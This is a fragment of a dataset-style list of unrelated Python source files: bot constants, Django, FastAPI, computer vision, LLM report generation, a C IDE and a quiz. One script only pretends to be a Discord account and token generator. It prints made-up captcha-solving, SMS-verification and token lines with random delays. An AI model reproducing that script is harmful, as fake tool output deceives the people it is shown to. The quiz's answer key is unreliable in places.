DEL_ETED_CUSTOM_THUMB_NAIL = \"\u2705 C\u1d1cs\u1d1b\u1d0f\u1d0d \u1d1b\u029c\u1d1c\u1d0d\u0299\u0274\u1d00\u026a\u029f \u1d04\u029f\u1d07\u1d00\u0280\u1d07\u1d05 s\u1d1c\u1d04\u1d04\u1d07s\u0493\u1d1c\u029f\u029f\u028f\"\n    FF_MPEG_DEL_ETED_CUSTOM_MEDIA = \"\u2705 Media cleared succesfully.\"\n    SAVED_RECVD_DOC_FILE = \"Document Downloaded Successfully.\"\n    CUSTOM_CAPTION_UL_FILE = \"MaviMods\"\n    NO_CUSTOM_THUMB_NAIL_FOUND = \"N\u1d0f \u1d04\u1d1cs\u1d1b\u1d0f\u1d0d \u1d1b\u029c\u1d1c\u1d0d\u0299\u0274\u1d00\u026a\u029f \u0493\u1d0f\u1d1c\u0274\u1d05\"\n    NO_VOID_FORMAT_FOUND = \"ERROR... <code>{}</code>\"\n    FILE_NOT_FOUND = \"Error, File not Found!!\"\n    USER_ADDED_TO_DB = \"User <a href='tg://user?id={}'>{}</a> added to {} till {}.\"\n    SOMETHING_WRONG = \"<code>Something Wrong. Try again.</code>\"\n    REPLY_TO_DOC_GET_LINK = \"Reply to a Telegram media to get High Speed Direct Download Link\"\n    REPLY_TO_DOC_FOR_C2V = \"Reply to a Telegram media to convert\"\n    REPLY_TO_DOC_FOR_SCSS = \"Reply to a Telegram media to get screenshots\"\n    REPLY_TO_DOC_FOR_RENAME_FILE = \"Reply to a Telegram media to /ren with custom thumbnail support\"\n    AFTER_GET_GOFILE_LINK = \" <b>File Name :</b> <code>{}</code>\\n<b>File Size :</b> {}\\n<b>File MD5 Checksum :</b> <code>{}</code>\\n\\n<b>\u26a1Link\u26a1 :</b> <code>{}</code>\\n\\n Valid untill 10 days of inactivity\\nJoin : @MODSMAVI\"\n    FF_MPEG_RO_BOT_RE_SURRECT_ED = \"\"\"Syntax: /trim HH:MM:SS for screenshot of that specific time.\"\"\"\n    FF_MPEG_RO_BOT_STEP_TWO_TO_ONE = \"First send /downloadmedia to any media so that it can be downloaded to my local. \\nSend /storageinfo to know the media, that is currently downloaded.\"\n    FF_MPEG_RO_BOT_STOR_AGE_INFO = \"Video Duration: {}\\nSend /clearffmpegmedia to delete this media, from my storage.\\nSend /trim HH:MM:SS [HH:MM:SS",
    "from django.contrib.auth.base_user import BaseUserManager\nfrom django.utils.translation import gettext_lazy as _\n\n\n# Adapted from: https://github.com/veryacademy/YT-Django-Theory-Create-Custom-User-Models-Admin-Testing/blob/master/users/models.py\n# Accessed 2024-02-22\nclass CustomAuthorManager(BaseUserManager):\n    def create_user(self, email, display_name, password=None, **other_fields):\n        if not email:\n            raise ValueError(_('Users must have an email address'))\n\n        user = self.model(\n            email=self.normalize_email(email),\n            display_name=display_name,\n            **other_fields\n        )\n\n        user.set_password(password)\n        user.save()\n        return user\n\n    def create_superuser(self, email, display_name, password, **other_fields):\n        other_fields.setdefault('is_staff', True)\n        other_fields.setdefault('is_superuser', True)\n        other_fields.setdefault('is_active', True)\n\n        user = self.create_user(\n            email,\n            display_name=display_name,\n            password=password,\n            **other_fields\n        )\n        user.is_admin = True\n        user.save()\n        return user\n",
    "#Importing OpenCV Library for basic image processing functions\nimport cv2\n# Numpy for array related functions\nimport numpy as np\n# Dlib for deep learning based Modules and face landmark detection\nimport dlib\n#face_utils for basic operations of conversion\nfrom imutils import face_utils\n\n\n#Initializing the camera and taking the instance\ncap = cv2.VideoCapture(0)\n# Set resolution to 720p\ncap.set(cv2.CAP_PROP_FRAME_WIDTH, 960)\ncap.set(cv2.CAP_PROP_FRAME_HEIGHT, 540)\n\n# Set frame rate to 30 FPS\ncap.set(cv2.CAP_PROP_FPS,30)\n\n#Initializing the face detector and landmark detector\ndetector = dlib.get_frontal_face_detector()\npredictor = dlib.shape_predictor(\"shape_predictor_68_face_landmarks.dat\")\n\n#status marking for current state\nsleep = 0\ndrowsy = 0\nactive = 0\nstatus=\"\"\ncolor=(0,0,0)\n\ndef compute(ptA,ptB):\n\tdist = np.linalg.norm(ptA - ptB)\n\treturn dist\n\ndef blinked(a,b,c,d,e,f):\n\tup = compute(b,d) + compute(c,e)\n\tdown = compute(a,f)\n\tratio = up/(2.0*down)\n\n\t#Checking if it is blinked\n\tif(ratio>0.25):\n\t\treturn 2\n\telif(ratio>0.21 and ratio<=0.25):\n\t\treturn 1\n\telse:\n\t\treturn 0\n\n\nwhile True:\n    _, frame = cap.read()\n    gray = cv2.cvtColor(frame, cv2.COLOR_BGR2GRAY)\n\n    faces = detector(gray)\n    #detected face in faces array\n    for face in faces:\n        x1 = face.left()\n        y1 = face.top()\n        x2 = face.right()\n        y2 = face.bottom()\n\n        face_frame = frame.copy()\n        cv2.rectangle(face_frame, (x1, y1), (x2, y2), (0, 255, 0), 2)\n\n        landmarks = predictor(gray, face)\n        landmarks = face_utils.shape_to_np(landmarks)\n\n        #The numbers are actually the landmarks which will show eye\n        left_blink = blinked(landmarks[36],landmarks[37], \n        \tlandmarks[38], landmarks[41], landmarks[40], landmarks[39])\n        right_blink = blinked(landmarks[42],landmarks[43], \n        \tlandmarks[44], landmarks[47], landmarks[46], landmarks[45])\n        \n        #Now judge what to do for the eye blinks\n        if(left_blink==0 or right_blink==0):\n        \tsleep+=1\n        \tdrowsy=0\n        \tactive=0\n        \tif(sleep>6):\n        \t\tstatus=\"SLEEPING !!!\"\n        \t\tcolor = (255,0,0)\n\n        elif(left_blink==1 or right_blink==1):\n        \tsleep=0\n        \tactive=0\n        \tdrowsy+=1\n        \tif(drowsy>6):\n        \t\tstatus=\"Drowsy !\"\n        \t\tcolor = (0,0,255)\n\n        else:\n        \tdrowsy=0\n        \tsleep=0\n        \tactive+=1\n        \tif(active>6):\n        \t\tstatus=\"Active :)\"\n        \t\tcolor = (0,255,0)\n        \t\n        cv2.putText(frame, status, (100,100), cv2.FONT_HERSHEY_SIMPLEX, 1.2, color,3)\n\n        for n in range(0, 68):\n        \t(x,y) = landmarks[n]\n        \tcv2.circle(face_frame, (x, y), 1, (255, 255, 255), -1)\n\n    cv2.imshow(\"Frame\", frame)\n    cv2.imshow(\"Result of detector\", face_frame)\n    key = cv2.waitKey(1)\n    if key == 27:\n      \tbreak",
    "import uuid\nfrom typing import Union, List\n\nfrom fastapi import APIRouter\nfrom starlette import status\nfrom starlette.responses import JSONResponse, Response\n\nfrom app.database.transaction.utils import transactional\nfrom app.schema.user import User, UserCreate, UserUpdate\nfrom app.services.user import UserService\n\nuser_router = APIRouter(prefix=\"/user\", tags=[\"users\"])\nuser_service = UserService()\n\n\n@user_router.get(\n    \"/{user_id}\", status_code=status.HTTP_200_OK, response_model=Union[User, None]\n)\n@transactional\nasync def get_user_by_id(user_id: uuid.UUID):\n    return await user_service.get_user(user_id=user_id)\n\n\n@user_router.get(\n    \"/\", status_code=status.HTTP_200_OK, response_model=Union[List[User], None]\n)\n@transactional\nasync def get_all_users():\n    return await user_service.get_user(user_id=None)\n\n\n@user_router.post(\"/\", status_code=status.HTTP_201_CREATED, response_model=None)\n@transactional\nasync def create_user(user: UserCreate):\n    return await user_service.create_user(user)\n\n\n@user_router.put(\"/{user_id}\", status_code=status.HTTP_200_OK, response_model=User)\n@transactional\nasync def update_user(user_id: uuid.UUID, user: UserUpdate):\n    result = await user_service.update_user(user_id=user_id, user=user)\n    return (\n        result\n        if result\n        else JSONResponse(\n            content={\"message\": \"User is not updated\"},\n            status_code=status.HTTP_400_BAD_REQUEST,\n        )\n    )\n\n\n@user_router.delete(\n    \"/{user_id}\", status_code=status.HTTP_204_NO_CONTENT, response_class=Response\n)\n@transactional\nasync def delete_user(user_id: uuid.UUID):\n    if await user_service.delete_user(user_id=user_id):\n        return JSONResponse(\n            content={\"message\": \"User is deleted\"},\n            status_code=status.HTTP_204_NO_CONTENT,\n        )\n    return JSONResponse(\n        content={\"message\": \"User is not deleted\"},\n        status_code=status.HTTP_404_NOT_FOUND,\n    )\n",
    "import yfinance as yf\nfrom matplotlib import pyplot as plt\nfrom pandas.tseries.offsets import DateOffset\nfrom sec_api import ExtractorApi\nimport requests\nimport json\nimport numpy as np\nfrom openai import OpenAI\nimport os\nfrom utils import get_earnings_transcript, Raptor\nfrom langchain_community.embeddings.sentence_transformer import (\n    SentenceTransformerEmbeddings,\n)\nfrom langchain_openai import ChatOpenAI\nfrom langchain_community.vectorstores import Chroma\nfrom langchain_core.output_parsers import StrOutputParser\nfrom langchain import hub\nfrom langchain_core.runnables import RunnablePassthrough\n\nfrom reportlab.lib import colors\nfrom reportlab.lib import pagesizes\nfrom reportlab.platypus import SimpleDocTemplate, Frame, Paragraph, Image, PageTemplate, FrameBreak, Spacer, Table, TableStyle, NextPageTemplate, PageBreak\nfrom reportlab.lib.units import inch\nfrom reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle\nfrom reportlab.lib.enums import TA_JUSTIFY, TA_LEFT\n\nLANGCHAIN_TRACING_V2=True\nLANGCHAIN_ENDPOINT=\"https://api.smith.langchain.com\"\nLANGCHAIN_API_KEY=\"...\"\nLANGCHAIN_PROJECT=\"llmops-sample\"\n\nticker_symbol = \"NVDA\"  # The ticker symbol of the company. US stock only.\nsec_api_key = os.environ.get(\"SEC_API_KEY\")  # Your SEC API key, get it from https://sec-api.io/ for free.\n\n#llm = \"gpt-4-turbo-preview\"\n#llm = \"llama2\"\nllm = \"openchat\"\n\n# embd = OpenAIEmbeddings()\n# create the open-source embedding function\nembd = SentenceTransformerEmbeddings(model_name=\"all-MiniLM-L6-v2\")\nmodel = ChatOpenAI(temperature=0, model=llm)\nrag_helper = Raptor(model, embd)\n\nif 'gpt' in llm:\n    print(\"Using OpenAI GPT\")\n    client = OpenAI(\n        # This is the default and can be omitted\n        api_key=os.environ.get(\"OPENAI_API_KEY\"),\n    )\nelse:\n    print(\"Using local LLM, make sure you have installed Ollama (https://ollama.com/download) and have it running\")\n    client = OpenAI(\n        base_url='http://localhost:11434/v1',\n        api_key='ollama',  # required, but unused\n    )\n\n\nclass ReportAnalysis:\n    def __init__(self, ticker_symbol):\n        self.ticker_symbol = ticker_symbol\n        self.stock = yf.Ticker(ticker_symbol)\n        self.info = self.stock.info\n        self.project_dir = f\"projects/{ticker_symbol}/\"\n        os.makedirs(self.project_dir, exist_ok=True)\n        self.extractor = ExtractorApi(sec_api_key)\n        self.report_address = self.get_sec_report_address()\n\n        # self.system_prompt_v3 = \"\"\"\n        self.system_prompt = f\"\"\"\n            Role: Expert Investor in {self.stock.info['industry']}\n            Department: Finance\n            Primary Responsibility: Generation of Customized Financial Analysis Reports\n\n            Role Description: As an Expert Investor within the finance domain, your expertise is harnessed to develop \n            bespoke Financial Analysis Reports that cater to specific client requirements. This role demands a deep \n            dive into financial statements and market data to unearth insights regarding a company's financial \n            performance and stability. Engaging directly with clients to gather essential information and \n            continuously refining the report with their feedback ensures the final product precisely meets their \n            needs and expectations. Generate reports similar quality to Goldman Sachs.\n\n            Key Objectives:\n\n            Analytical Precision: Employ meticulous analytical prowess to interpret financial data, identifying \n            underlying trends and anomalies. Effective Communication: Simplify and effectively convey complex \n            financial narratives, making them accessible and actionable to non-specialist audiences. Client Focus: \n            Dynamically tailor reports in response to client feedback, ensuring the final analysis aligns with their \n            strategic objectives. Adherence to Excellence: Maintain the highest standards of quality and integrity in \n            report generation, following established benchmarks for analytical rigor. Performance Indicators: The \n            efficacy of the Financial Analysis Report is measured by its utility in providing clear, actionable \n            insights. This encompasses aiding corporate decision-making, pinpointing areas for operational \n            enhancement, and offering a lucid evaluation of the company's financial health. Success is ultimately \n            reflected in the report's contribution to informed investment decisions and strategic planning.\n            \n            Technology Integration:\n\n            Utilize advanced FinTech tools for data analysis, including: Sentiment Analysis Platforms: Leverage \n            AI-powered platforms to analyze public sentiment towards company and its products, gauging potential market \n            reception for upcoming releases. Alternative Data Providers: Access and analyze alternative data sets \n            sourced from web traffic, app downloads, and social media engagement to gain deeper i",
    "# Ultralytics YOLO \ud83d\ude80, AGPL-3.0 license\n\nimport contextlib\nimport re\nimport shutil\nimport subprocess\nfrom itertools import repeat\nfrom multiprocessing.pool import ThreadPool\nfrom pathlib import Path\nfrom urllib import parse, request\n\nimport requests\nimport torch\n\nfrom ultralytics.utils import LOGGER, TQDM, checks, clean_url, emojis, is_online, url2file\n\n# Define Ultralytics GitHub assets maintained at https://github.com/ultralytics/assets\nGITHUB_ASSETS_REPO = 'ultralytics/assets'\nGITHUB_ASSETS_NAMES = [f'yolov8{k}{suffix}.pt' for k in 'nsmlx' for suffix in ('', '-cls', '-seg', '-pose')] + \\\n                      [f'yolov5{k}{resolution}u.pt' for k in 'nsmlx' for resolution in ('', '6')] + \\\n                      [f'yolov3{k}u.pt' for k in ('', '-spp', '-tiny')] + \\\n                      [f'yolo_nas_{k}.pt' for k in 'sml'] + \\\n                      [f'sam_{k}.pt' for k in 'bl'] + \\\n                      [f'FastSAM-{k}.pt' for k in 'sx'] + \\\n                      [f'rtdetr-{k}.pt' for k in 'lx'] + \\\n                      ['mobile_sam.pt']\nGITHUB_ASSETS_STEMS = [Path(k).stem for k in GITHUB_ASSETS_NAMES]\n\n\ndef is_url(url, check=True):\n    \"\"\"Check if string is URL and check if URL exists.\"\"\"\n    with contextlib.suppress(Exception):\n        url = str(url)\n        result = parse.urlparse(url)\n        assert all([result.scheme, result.netloc])  # check if is url\n        if check:\n            with request.urlopen(url) as response:\n                return response.getcode() == 200  # check if exists online\n        return True\n    return False\n\n\ndef delete_dsstore(path, files_to_delete=('.DS_Store', '__MACOSX')):\n    \"\"\"\n    Deletes all \".DS_store\" files under a specified directory.\n\n    Args:\n        path (str, optional): The directory path where the \".DS_store\" files should be deleted.\n        files_to_delete (tuple): The files to be deleted.\n\n    Example:\n        ```python\n        from ultralytics.utils.downloads import delete_dsstore\n\n        delete_dsstore('path/to/dir')\n        ```\n\n    Note:\n        \".DS_store\" files are created by the Apple operating system and contain metadata about folders and files. They\n        are hidden system files and can cause issues when transferring files between different operating systems.\n    \"\"\"\n    # Delete Apple .DS_store files\n    for file in files_to_delete:\n        matches = list(Path(path).rglob(file))\n        LOGGER.info(f'Deleting {file} files: {matches}')\n        for f in matches:\n            f.unlink()\n\n\ndef zip_directory(directory, compress=True, exclude=('.DS_Store', '__MACOSX'), progress=True):\n    \"\"\"\n    Zips the contents of a directory, excluding files containing strings in the exclude list. The resulting zip file is\n    named after the directory and placed alongside it.\n\n    Args:\n        directory (str | Path): The path to the directory to be zipped.\n        compress (bool): Whether to compress the files while zipping. Default is True.\n        exclude (tuple, optional): A tuple of filename strings to be excluded. Defaults to ('.DS_Store', '__MACOSX').\n        progress (bool, optional): Whether to display a progress bar. Defaults to True.\n\n    Returns:\n        (Path): The path to the resulting zip file.\n\n    Example:\n        ```python\n        from ultralytics.utils.downloads import zip_directory\n\n        file = zip_directory('path/to/dir')\n        ```\n    \"\"\"\n    from zipfile import ZIP_DEFLATED, ZIP_STORED, ZipFile\n\n    delete_dsstore(directory)\n    directory = Path(directory)\n    if not directory.is_dir():\n        raise FileNotFoundError(f\"Directory '{directory}' does not exist.\")\n\n    # Unzip with progress bar\n    files_to_zip = [f for f in directory.rglob('*') if f.is_file() and all(x not in f.name for x in exclude)]\n    zip_file = directory.with_suffix('.zip')\n    compression = ZIP_DEFLATED if compress else ZIP_STORED\n    with ZipFile(zip_file, 'w', compression) as f:\n        for file in TQDM(files_to_zip, desc=f'Zipping {directory} to {zip_file}...', unit='file', disable=not progress):\n            f.write(file, file.relative_to(directory))\n\n    return zip_file  # return path to zip file\n\n\ndef unzip_file(file, path=None, exclude=('.DS_Store', '__MACOSX'), exist_ok=False, progress=True):\n    \"\"\"\n    Unzips a *.zip file to the specified path, excluding files containing strings in the exclude list.\n\n    If the zipfile does not contain a single top-level directory, the function will create a new\n    directory with the same name as the zipfile (without the extension) to extract its contents.\n    If a path is not provided, the function will use the parent directory of the zipfile as the default path.\n\n    Args:\n        file (str): The path to the zipfile to be extracted.\n        path (str, optional): The path to extract the zipfile to. Defaults to None.\n        exclude (tuple, optional): A tuple of filename strings to be excluded. Defaults to ('.DS_Store', '__MACOSX').\n        exist_ok (bool, optional): Whether to overwrite existing contents if they exist. Defaul",
    "import tkinter as tk\r\nfrom tkinter import scrolledtext, filedialog, messagebox\r\nimport subprocess\r\nimport os\r\nwindow = tk.Tk()\r\nwindow.title(\"ZE-C 1.0\")\r\nwindow.geometry(\"800x600\")\r\nwindow.config(bg='#2d2d2d')\r\ncurrent_file_path = ''\r\nmenu_bar = tk.Menu(window, bg='#2d2d2d', fg='#ffffff')\r\nwindow.config(menu=menu_bar)\r\nfile_menu = tk.Menu(menu_bar, tearoff=0, bg='#2d2d2d', fg='#ffffff')\r\nmenu_bar.add_cascade(label=\"\u6587\u4ef6\", menu=file_menu)\r\ndef new_file():\r\n    global current_file_path\r\n    file_path = filedialog.asksaveasfilename(defaultextension=\".c\",\r\n                                             filetypes=[(\"C files\", \"*.c\"), (\"All files\", \"*.*\")])\r\n    if file_path:\r\n        current_file_path = file_path\r\n        text_area.delete('1.0', tk.END)\r\nfile_menu.add_command(label=\"\u65b0\u5efa\", command=new_file)\r\ndef open_file():\r\n    global current_file_path\r\n    file_path = filedialog.askopenfilename(filetypes=[(\"C files\", \"*.c\"), (\"All files\", \"*.*\")])\r\n    if file_path:\r\n        current_file_path = file_path\r\n        with open(current_file_path, 'r') as file:\r\n            code = file.read()\r\n            text_area.delete('1.0', tk.END)\r\n            text_area.insert('1.0', code)\r\nfile_menu.add_command(label=\"\u6253\u5f00\u6587\u4ef6\", command=open_file)\r\ndef save_code():\r\n    global current_file_path\r\n    if current_file_path:\r\n        with open(current_file_path, 'w') as file:\r\n            code = text_area.get('1.0', tk.END)\r\n            file.write(code)\r\nfile_menu.add_command(label=\"\u4fdd\u5b58\", command=save_code)\r\nfile_menu.add_separator()\r\nfile_menu.add_command(label=\"\u9000\u51fa\", command=window.quit)\r\ntool_bar = tk.Frame(window, bg='#2d2d2d', bd=1, relief=tk.RAISED)\r\ntool_bar.pack(side=tk.TOP, fill=tk.X)\r\nnew_button = tk.Button(tool_bar, text=\"\u65b0\u5efa\", command=new_file, bg='#3a3a3a', fg='#ffffff', relief=tk.FLAT, padx=10, pady=5)\r\nnew_button.pack(side=tk.LEFT, padx=5)\r\nopen_button = tk.Button(tool_bar, text=\"\u6253\u5f00\u6587\u4ef6\", command=open_file, bg='#3a3a3a', fg='#ffffff', relief=tk.FLAT, padx=10, pady=5)\r\nopen_button.pack(side=tk.LEFT, padx=5)\r\ndef compile_code():\r\n    save_code()\r\n    if current_file_path:\r\n        compile_command = f\"gcc.exe {current_file_path} -o {current_file_path}.exe\"\r\n        subprocess.Popen(compile_command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()\r\n        if os.path.exists(f\"{current_file_path}.exe\"):\r\n            messagebox.showinfo(\"\u7f16\u8bd1\u6210\u529f\", \"\u7f16\u8bd1\u6210\u529f\uff01\")\r\ncompile_button = tk.Button(tool_bar, text=\"\u7f16\u8bd1\", command=compile_code, bg='#3a3a3a', fg='#ffffff', relief=tk.FLAT, padx=10, pady=5)\r\ncompile_button.pack(side=tk.LEFT, padx=5)\r\ndef run_code():\r\n    if current_file_path:\r\n        run_command = f\"cmd /c start /wait {current_file_path}.exe\"\r\n        subprocess.Popen(run_command, shell=True)\r\nrun_button = tk.Button(tool_bar, text=\"\u8fd0\u884c\", command=run_code, bg='#3a3a3a', fg='#ffffff', relief=tk.FLAT, padx=10, pady=5)\r\nrun_button.pack(side=tk.LEFT, padx=5)\r\ndef compile_and_run_code():\r\n    compile_code()\r\n    run_code()\r\ncompile_run_button = tk.Button(tool_bar, text=\"\u7f16\u8bd1\u8fd0\u884c\", command=compile_and_run_code, bg='#3a3a3a', fg='#ffffff', relief=tk.FLAT, padx=10, pady=5)\r\ncompile_run_button.pack(side=tk.LEFT, padx=5)\r\ntext_area = scrolledtext.ScrolledText(window, wrap=tk.WORD, width=100, height=30, bg='#383838', fg='#ffffff', insertbackground='#ffffff', font=(\"Courier\", 12))  \r\ntext_area.pack(padx=10, pady=10, fill=tk.BOTH, expand=True)\r\nwindow.mainloop()\r\n",
    "import random\nimport time\nfrom datetime import datetime\nfrom colorama import Fore, init\nimport string\nimport threading\nimport keyboard\nimport sys\nfrom colorama import Fore as f\nfrom datetime import datetime\nimport os; os.system(\"cls\")\nimport time, base64, string, random, threading\nfrom decimal import Decimal\nimport secrets\nimport base64\nimport uuid\n\n\ndef generate_unique_token():\n    sample_string = str(random.randint(0, 999999999999999999)).zfill(18)\n    sample_string_bytes = sample_string.encode(\"ascii\")\n    base64_bytes = base64.b64encode(sample_string_bytes)\n    base64_string = base64_bytes.decode(\"ascii\")\n\n    token = \"MT\" + base64_string + \".\" + random.choice(string.ascii_uppercase) + ''.join(\n        random.choice(string.ascii_letters + string.digits) for _ in range(5)) + \".\" + ''.join(\n        random.choice(string.ascii_letters + string.digits) for _ in range(27))\n\n    # Generate a new UUID for each token\n    unique_id = str(uuid.uuid4())\n\n    # Append the UUID to the token to ensure uniqueness\n    unique_token = token + \".\" + unique_id\n\n    return unique_token\n\n# Generate and print a unique token\n\n\n\ndef generate_random_email():\n    domains = ['gmail.com', 'yahoo.com', 'outlook.com', 'hotmail.com', 'aol.com']\n    username_length = random.randint(5, 15)\n    username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=username_length))\n    domain = random.choice(domains)\n    return f\"{username}@{domain}\"\n\n# Print a single random email\nprint(generate_random_email())\n\ndef on_key_press(event):\n    if event.name == 'q':  # Change 'q' to the key you want to use\n        print(\"Exiting program...\")\n        sys.exit()\n\nprint(\"Press 'q' to exit the program.\")\nkeyboard.on_press(on_key_press)\n\ndef generate_random_string(length):\n    characters = string.ascii_letters + string.digits\n    return ''.join(random.choices(characters, k=length))\n\n\n\ndef generate_uk_phone_number():\n    area_codes = ['012', '0131', '0141', '0151', '0161', '0191']\n    middle_digits = ''.join(random.choices('0123456789', k=7))\n    area_code = random.choice(area_codes)\n    return f\"0{area_code}{middle_digits}\"\n\n# Print a random UK phone number\nprint(generate_uk_phone_number())\n\n\n\n\ndef printa():\n    global start_time\n    for _ in range(50):\n        delay = random.uniform(0.05, 5)\n        time.sleep(delay)\n        end_time = time.time()\n        time_taken2 = round(random.uniform(0.5, 1),2) ##capcha info\n        time_taken = round(random.uniform(2, 10),2) ##solved\n        time_taken3 = round(random.uniform(13, 17),2) #token generated\n        text1 = f\"{Fore.MAGENTA}[g42] [{Fore.RED}Spammer Check{Fore.MAGENTA}]{Fore.WHITE} Spammer Flagged  {\"\\u274c\"} {time_taken} \"\n        text2 = f\"{Fore.MAGENTA}[g42] [{Fore.GREEN}Spammer Check{Fore.MAGENTA}]{Fore.WHITE} Not Spammer Flagged  {\"\\u2705\"} {time_taken} \"\n        random_text = random.choice([text1, text2])\n        print(f\"{Fore.MAGENTA}[g42] [{Fore.BLUE}Discord{Fore.MAGENTA}]{Fore.WHITE}\" , \"Got Captcha Info\" , time_taken2,\"s\" )\n        time.sleep(time_taken)\n        print(f\"{Fore.MAGENTA}[g42] [{Fore.CYAN}hCaptcha{Fore.MAGENTA}]{Fore.WHITE} -> {Fore.MAGENTA}[Solved hCaptcha P1_eyJ0eXAiOiJKV1QiLCJhbGci0iJIUZI1NiJ9.hadwYXNza2V5xQ{generate_random_string(16)}] {Fore.GREEN} In {Fore.WHITE}-> {Fore.GREEN}{time_taken} s\")\n        time.sleep(time_taken3)\n        print(f\"{Fore.MAGENTA}[g42] [{Fore.BLUE}Discord{Fore.MAGENTA}]{Fore.WHITE}Token Generated :  {generate_unique_token()} {\"\\u2705\"} {time_taken3} \")\n        time.sleep(2)\n        print(f\"{Fore.MAGENTA}[g42] [{Fore.LIGHTBLUE_EX}kopeechka{Fore.MAGENTA}]{Fore.WHITE}Email Verfied {generate_random_email()} {\"\\u2705\"} {time_taken} \")\n        time.sleep(2)\n        print(f\"{Fore.MAGENTA}[g42] [{Fore.GREEN}SMSHUB{Fore.MAGENTA}]{Fore.WHITE} Sms Verfied {generate_uk_phone_number()} {\"\\u2705\"} {time_taken} \")\n        time.sleep(2)\n        print(f\"{Fore.MAGENTA}[g42] [{Fore.GREEN}Spammer Check{Fore.MAGENTA}]{Fore.WHITE} Sms Verfied {generate_uk_phone_number()} {\"\\u2705\"} {time_taken} \")\n        print(random_text)\n\n        \n\n\nstart_time = time.time()\n\nthreads = []\nfor _ in range(20):\n    thread = threading.Thread(target=printa)\n    threads.append(thread)\n    thread.start()\n\nfor thread in threads:\n    thread.join()\n",
    "\"\"\"\nThis script downloads the weights for the specified model from the Hugging Face Hub and saves them in the models folder.\n\"\"\"\n\nfrom huggingface_hub import snapshot_download\nimport sys\n\nif len(sys.argv) < 2:\n    print(\n        \"Usage: python download_weights.py <model_name> \\nAvailable models: mixedbread-ai/mxbai-embed-large-v1, mixedbread-ai/mxbai-rerank-xsmall-v1\"\n    )\n    exit(1)\n\nif __name__ == \"__main__\":\n    model_name = sys.argv[1]\n    if model_name not in [\n        \"mixedbread-ai/mxbai-embed-large-v1\",\n        \"mixedbread-ai/mxbai-rerank-xsmall-v1\",\n    ]:\n        print(\n            \"Usage: python download_weights.py <model_name> \\nAvailable models: mixedbread-ai/mxbai-embed-large-v1, mixedbread-ai/mxbai-rerank-xsmall-v1\"\n        )\n        exit(1)\n    snapshot_download(\n        repo_id=model_name,\n        local_dir=f\"models/{model_name.split('/')[-1]}\",\n        local_dir_use_symlinks=False,\n        ignore_patterns=[\n            \"mxbai-embed-large-v1-f16.gguf\",\n            \"model.onnx\",\n            \"model_fp16.onnx\",\n            \"model_quantized.onnx\",\n        ],\n    )\n    print(f\"Downloaded weights for model {model_name} at {model_name.split('/')[-1]}\")\n",
    "questions = (\"What is the most popular programming language as of April 12th 2024? (it is NOT the thing this quiz is coded in): \",\n                       \"What is the square root of 5 x 4 / 578384?: \",\n                       \"What programming language does Minecraft BEDROCK run on?: \",\n                       \"Which planet is the farthest from Earth?: \",\n                       \"Which planet in the solar system is the hottest?: \",\n             \"Which sphere of the Earth that contains life?: \",\n             \"What is Scale of The Universe?: \",\n             \"What is 0 divided by 0?: \",\n             \"What is the difference between coding and programming?: \",\n             \"Which Programming language does this quiz use?: \",\n            \"What is my most popular project on github ( as of 4/18/24)?: \",\n            \"What is the most downloaded game of all time?: \",\n            \"What is the most popular web browser?: \",)\n\noptions = ((\"A. C++\", \"B. Python\", \"C. JavaScript\", \"D. HTML/CSS\", \"E. Block Coding/Scratch\"),\n                   (\"A. I have no idea\", \"B. 0.00001546424\", \"C. 2\", \"D. 0.00001546425\", \"E. 0.5\"),\n                   (\"A. Java Script\", \"B. Java\", \"C. Python\", \"D. Bedrock\", \"E. C++\"),\n                   (\"A. Neptune\", \"B. Mercury\", \"C. Mars\", \"D. Uranus\", \"E. Pluto\"),\n                   (\"A. Venus\", \"B. Mercury\", \"C. Earth\", \"D. Mars\", \"E. Uranus\"),\n          (\"A. Hydrosphere\", \"B. Biosphere\", \"C. Atmosphere\", \"D. Geosphere\", \"E. Atmostsphere\"),\n          (\"A. A tool to find code\", \"B. A calculator\", \"C. A tool to Find the ratio of Earth\", \"D. A tool to find the scale of things in the universe\", \"E. IDK\"),\n          (\"A. 82\", \"B. 69\", \"C. 0\", \"D. 1\", \"E. Undefined\"),\n          (\"A. Coding uses higher level thinking\", \"B. Prographing uses higher level thinking\", \"C. Programming uses higher level thinking\", \"D. Programming is very easy to understand\", \"E. They are the same\"),\n          (\"A. Python\", \"B. Java\", \"C. Java Script\", \"D. HTML/CSS/PHP\", \"E. C++\"),\n          (\"A. Calculator\", \"B. Quiz\", \"C. 26gbush README.md\", \"D. IDK\", \"E. MATH\"),\n          (\"A. Minecraft\", \"B. Roblox\", \"C. Tetris\", \"D. GTA 5\", \"E. Pac-Man\"),\n          (\"A. Edge\", \"B. Chrome\", \"C. Firefox\", \"D. Opera\", \"E. Brave\"),)\n\nanswers = (\"C\", \"B\", \"E\", \"A\", \"A\", \"B\", \"D\", \"E\", \"C\", \"A\", \"B\", \"A\", \"B\")\nguesses = []\nscore = 0\nquestion_num = 0\n\nfor question in questions:\n    print(\"----------------------\")\n    print(question)\n    for option in options[question_num]:\n        print(option)\n\n    guess = input(\"Enter (A, B, C, D, E): \").upper()\n    guesses.append(guess)\n    if guess == answers[question_num]:\n        score += 1\n        print(\"CORRECT!\")\n    else:\n        print(\"INCORRECT!\")\n        print(f\"{answers[question_num]} is the correct answer\")\n    question_num += 1\n\nprint(\"----------------------\")\nprint(\"       RESULTS        \")\nprint(\"----------------------\")\n\nprint(\"answers: \", end=\"\")\nfor answer in answers:\n    print(answer, end=\" \")\nprint()\n\nprint(\"guesses: \", end=\"\")\nfor guess in guesses:\n    print(guess, end=\" \")\nprint()\n\nscore = int(score / len(questions) * 100)\nprint(f\"Your score is: {score}%\")\n",
